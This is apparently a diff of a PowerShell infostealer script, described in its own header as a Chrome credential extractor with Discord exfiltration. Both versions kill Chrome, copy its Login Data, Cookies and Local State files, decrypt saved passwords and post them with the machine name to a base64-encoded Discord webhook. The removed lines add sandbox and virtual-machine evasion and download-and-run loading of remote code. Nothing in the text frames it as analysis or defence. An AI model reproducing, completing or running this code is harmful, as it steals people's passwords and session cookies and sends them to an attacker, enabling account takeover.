@@ -1,106 +1,77 @@
 <#
 .SYNOPSIS
-  Chrome credential extractor with Discord exfiltration
+  Chrome credential extractor with Discord delivery
 #>
 
-#region Anti-Detection Measures
-if ($env:UserName -eq "SYSTEM" -or $env:UserName -eq "sandbox") { exit }
-if ((Get-WmiObject Win32_ComputerSystem).Model -like "*Virtual*") { exit }
-if ((Get-CimInstance Win32_BIOS).SerialNumber -like "*VMWare*") { exit }
+# 1. Webhook Configuration (BASE64 ENCODED!)
+$encWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2NzMwMzUwOTcxMTY1MDgzNi9udUFwbkdTLUR2TmNlcWxwNldKRXFLYmdFODVMWkhxdVZXRWdwOVllQlh3cTR2NDdYVzA2Sk5yUXM0UWlHc2FjcV81ZA=="
+$dcWebhook = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encWebhook))
 
-# Obfuscated webhook URL
-$dcWebhook = [System.Text.Encoding]::UTF8.GetString(
-    [System.Convert]::FromBase64String(
-        "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2NzMwMzUwOTcxMTY1MDgzNi9udUFwbkdTLUR2TmNlcWxwNldKRXFLYmdFODVMWkhxdVZXRWdwOVllQlhxNHY0N1hXMDZKTnJRczRRaUdzYWNxXzVk"
-    )
-)
-#endregion
-
-#region Memory-Based Execution
-function Invoke-InMemory {
-    param([string]$url)
-    $ProgressPreference = 'SilentlyContinue'
-    $script = (New-Object Net.WebClient).DownloadString($url)
-    $scriptBlock = [scriptblock]::Create($script)
-    & $scriptBlock
-}
-
-# Load required assemblies from memory
-$assemblies = @{
-    "System.Data.SQLite" = "https://cdn.discordapp.com/attachments/.../System.Data.SQLite.dll"
-    "BouncyCastle" = "https://cdn.discordapp.com/attachments/.../BouncyCastle.Crypto.dll"
-}
-
-foreach ($assembly in $assemblies.Keys) {
+# 2. DLL Auto-Selection
+function Load-SQLite {
+    param($tempDir)
     try {
-        $dllBytes = (New-Object Net.WebClient).DownloadData($assemblies[$assembly])
-        [System.Reflection.Assembly]::Load($dllBytes) | Out-Null
-    } catch { continue }
-}
-#endregion
-
-#region Main Functionality
-try {
-    # Kill Chrome processes
-    Get-Process chrome* -ErrorAction SilentlyContinue | Stop-Process -Force
-    Start-Sleep -Milliseconds 300
-
-    # Create memory stream for Chrome data
-    $memStream = New-Object IO.MemoryStream
-    $chromeFiles = @("Login Data", "Cookies", "Web Data", "..\Local State")
-    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
-
-    foreach ($file in $chromeFiles) {
-        $fullPath = Join-Path $chromePath $file
-        if (Test-Path $fullPath) {
-            $bytes = [IO.File]::ReadAllBytes($fullPath)
-            $memStream.Write($bytes, 0, $bytes.Length)
-        }
+        # Try .NET Standard first (modern systems)
+        $standardDll = Join-Path $tempDir "System.Data.SQLite.NETStandard.dll"
+        [Reflection.Assembly]::LoadFile($standardDll) | Out-Null
+        return $true
+    } catch {
+        # Fallback to .NET Framework (older systems)
+        $frameworkDll = Join-Path $tempDir "System.Data.SQLite.NETFramework.dll"
+        [Reflection.Assembly]::LoadFile($frameworkDll) | Out-Null
+        return $true
     }
+    return $false
+}
 
-    # Decrypt passwords
-    $credentials = @()
-    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=:memory:")
+# 3. Main Execution
+try {
+    # Create temp directory
+    $tempDir = "$env:TEMP\ChromeTemp_$(Get-Random)"
+    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+
+    # Kill Chrome
+    Stop-Process -Name "chrome" -Force -ErrorAction SilentlyContinue
+    Start-Sleep -Milliseconds 500
+
+    # Copy required files
+    Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" $tempDir -Force
+    Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies" $tempDir -Force
+    Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" $tempDir -Force
+
+    # Load BouncyCastle
+    $bcPath = Join-Path $tempDir "BouncyCastle.Crypto.dll"
+    [Reflection.Assembly]::LoadFile($bcPath) | Out-Null
+
+    # Load SQLite (auto-selects correct version)
+    if (-not (Load-SQLite $tempDir)) { throw "Failed to load SQLite" }
+
+    # Extract passwords
+    $conn = New-Object System.Data.SQLite.SQLiteConnection "Data Source=$(Join-Path $tempDir 'Login Data')"
     $conn.Open()
-    $conn.LoadExtension($memStream.ToArray())
-    
     $cmd = $conn.CreateCommand()
     $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
     $reader = $cmd.ExecuteReader()
 
+    $results = @()
     while ($reader.Read()) {
         $encrypted = $reader.GetValue(2)
-        $plain = [System.Security.Cryptography.ProtectedData]::Unprotect(
-            $encrypted,
-            $null,
-            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
-        )
-        $credentials += "$($reader.GetString(0)) | $($reader.GetString(1)) | $([Text.Encoding]::UTF8.GetString($plain))"
+        $plain = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, "CurrentUser")
+        $results += "$($reader.GetString(0)) | $($reader.GetString(1)) | $([Text.Encoding]::UTF8.GetString($plain))"
     }
-    $conn.Close()
-
-    # Prepare Discord message
-    $payload = @{
-        username = "Chrome Data"
-        content = "Credentials from $env:COMPUTERNAME ($env:UserName)"
-        embeds = @(
-            @{
-                title = "Extracted Data"
-                description = ($credentials -join "`n")
-                color = 16711680
-            }
-        )
-    } | ConvertTo-Json -Depth 5
 
     # Send to Discord
-    $null = Invoke-RestMethod -Uri $dcWebhook -Method Post -Body $payload -ContentType "application/json"
-}
-catch { 
-    # Silent error handling
+    $body = @{
+        content = "Chrome data from $env:COMPUTERNAME"
+        embeds = @(@{
+            title = "Extracted Credentials"
+            description = ($results -join "`n")
+            color = 16711680
+        })
+    }
+    Invoke-RestMethod -Uri $dcWebhook -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json"
 }
 finally {
     # Cleanup
-    if ($memStream) { $memStream.Dispose() }
-    Remove-Variable credentials,payload -Force
+    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
 }
-#endregion
